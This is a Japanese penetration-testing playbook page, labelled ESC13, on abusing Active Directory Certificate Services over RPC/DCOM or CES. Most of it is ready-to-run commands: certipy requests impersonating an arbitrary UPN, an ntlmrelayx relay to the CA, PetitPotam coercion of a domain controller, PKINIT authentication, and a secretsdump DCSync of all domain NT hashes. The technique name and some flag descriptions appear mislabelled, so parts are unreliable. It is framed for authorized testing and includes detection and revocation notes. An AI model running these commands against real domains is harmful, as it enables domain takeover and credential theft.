# ESC13 — DCOM / RPC / CES 経由の証明書発行（HTTP 以外の WebEnrollment 代替）

> **スコープ**: ESC8（HTTP WebEnrollment）が使えない場合の代替経路。RPC/DCOM（Certipy デフォルト）または CES（HTTPS ベース）経由で証明書を申請〜DCSync まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。演習環境では制約なし。

## 着火条件

- ESC8（HTTP WebEnrollment）のリレーは試みたが `/certsrv/` エンドポイントが存在しない・HTTPS 強制・NTLM 認証が無効化されている
- CA サーバーへの RPC/DCOM（`135/tcp` + ダイナミックポート）または CES（`443/tcp`）でのアクセスが可能
- または直接の認証情報で証明書を申請できる状況にある

## 環境前提
- 実行環境: テスター端末（CA サーバーへの RPC または CES ポートへの到達性があること）
- 必要なツール: `certipy`（`pip install certipy-ad`）/ Responder + ntlmrelayx（NTLM リレーを使う場合）
- ポート要件: RPC/DCOM リレー: `135/tcp` + ダイナミック高ポート / CES: `443/tcp`（通常 HTTPS）

## 先に確認すること

**攻撃者の思考トレース:** ESC8 は HTTP の `/certsrv/` WebEnrollment インターフェースへの NTLM リレーを悪用するが、このエンドポイントは無効化・HTTPS 化されていることがある。AD CS は HTTP 以外に RPC/DCOM（ICertPassage インターフェース）と CES（HTTPS ベースの証明書登録 Web サービス）も持つ。Certipy の `req` コマンドはデフォルトで RPC を使用するため、通常の証明書申請も実は RPC 経由で動作している。

---

## 1. 利用可能なエンドポイントの確認

**コマンド:**

```bash
# [Attacker] CA の利用可能なエンドポイントを Certipy で確認
certipy find -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -stdout
# "Web Enrollment: Disabled" なら HTTP WebEnrollment は使えない

# [Attacker] CES エンドポイントの存在確認（よくあるパス）
curl -k -I "https://[CA_SERVER_FQDN]/[CA_NAME]_CES_UsernamePassword/"
curl -k -I "https://[CA_SERVER_FQDN]/[CA_NAME]_CES_Kerberos/"
# HTTP 200 / 401 が返れば CES が存在する
```

**観測される出力 → 次のアクション:**

| シグナル | 判断 |
|---------|------|
| `Web Enrollment: Disabled` かつ `135/tcp` で CA に到達可能 | §2 パターン A RPC 経由の直接申請 |
| CES エンドポイントが HTTP 200/401 で応答 | §2 パターン B CES 経由の申請 |
| NTLM リレー環境で DC$ 認証を捕捉できた | §2 パターン C RPC/DCOM リレー |
| RPC/DCOM ポートがファイアウォールで遮断 | ESC1〜7 を再確認 |

---

## 2. 証明書申請（パターン別）

**事前準備（必須）:** `sudo ntpdate -u [DC_IP]` で時刻同期。

**パターン A: RPC 経由の直接証明書申請（Certipy デフォルト）:**

```bash
# [Attacker] Certipy は -web を指定しない限りデフォルトで RPC/DCOM 経由で申請する
certipy req -ca [CA_NAME] -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -upn [TARGET_UPN]

# CA が DC と別サーバーの場合は -target で CA サーバーを直接指定
certipy req -ca [CA_NAME] -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -target [CA_SERVER_IP] -upn [TARGET_UPN]
```

**パターン B: CES 経由の証明書申請:**

```bash
# [Attacker] CES（UsernamePassword 認証）経由で申請
certipy req -ca [CA_NAME] -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -web -upn [TARGET_UPN]
# -web フラグで HTTP/HTTPS ベースの CES エンドポイントを使用
```

**パターン C: RPC/DCOM エンドポイントへの NTLM リレー:**

```bash
# [Attacker] ntlmrelayx で CA の RPC エンドポイントにリレー（別ターミナルで Responder を起動）
sudo python3 ntlmrelayx.py -t "rpc://[CA_SERVER_IP]" --adcs --template [VULNERABLE_TEMPLATE] -smb2support

# [Attacker] DC$ の認証を Coerce で強制（別ターミナル）
python3 PetitPotam.py -u [USER] -p "[PASSWORD]" [ATTACKER_IP] [DC_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Saved certificate ... to '*.pfx'` | 証明書取得成功 | §3 PKINIT 認証へ |
| `[Errno Connection refused]` / `rpc_s_access_denied` | CA サーバーの RPC ポートへのファイアウォール | `-target` オプションで CA の IP を直接指定して確認 |
| CES が `401 Unauthorized` のみ | Kerberos 認証を要求している可能性 | `-web` + Kerberos チケット利用（`-k`）を試みる |

---

## 3. PKINIT 認証 → NT ハッシュ → DCSync

ESC8 の §4 と同一フロー → `ESC8.md`

```bash
# [Attacker] PKINIT 認証
certipy auth -pfx [TARGET_USERNAME].pfx -dc-ip [DC_IP]

# [Attacker] DCSync
impacket-secretsdump -just-dc-ntlm -no-pass -hashes :[NT_HASH] [DOMAIN]/[TARGET_USERNAME]@[DC_IP]

# [Attacker] 原状回復: 証明書の失効
certipy ca -ca [CA_NAME] -u [USER]@[DOMAIN] -p "[PASSWORD]" -dc-ip [DC_IP] -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき（全体）

| 状況 | 対処 |
|------|------|
| RPC ダイナミックポートがファイアウォールで遮断 | RPC 経由の申請が通らない。CES または ESC1〜7 を探す |
| ESC8 は使えず ESC13 も使えない | HTTP・RPC・CES すべてが利用不可。ESC1〜7 でテンプレート・ACL 経由の経路を再確認する |

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（証明書要求・発行）/ 4768（TGT 要求）/ RPC 接続ログ / MDI アラート
- **業務影響リスク**: 直接申請は業務影響は低い。NTLM リレーの場合はネットワーク干渉の可能性
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx の暗号化保管・テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `Overview.md`
- 前：ESC8（HTTP WebEnrollment への NTLM リレー。HTTP が使える場合の同等手法）→ `ESC8.md`
- 前：Coerce 系（NTLM リレーの起点）→ `../NTLM_Relay/Coerce.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
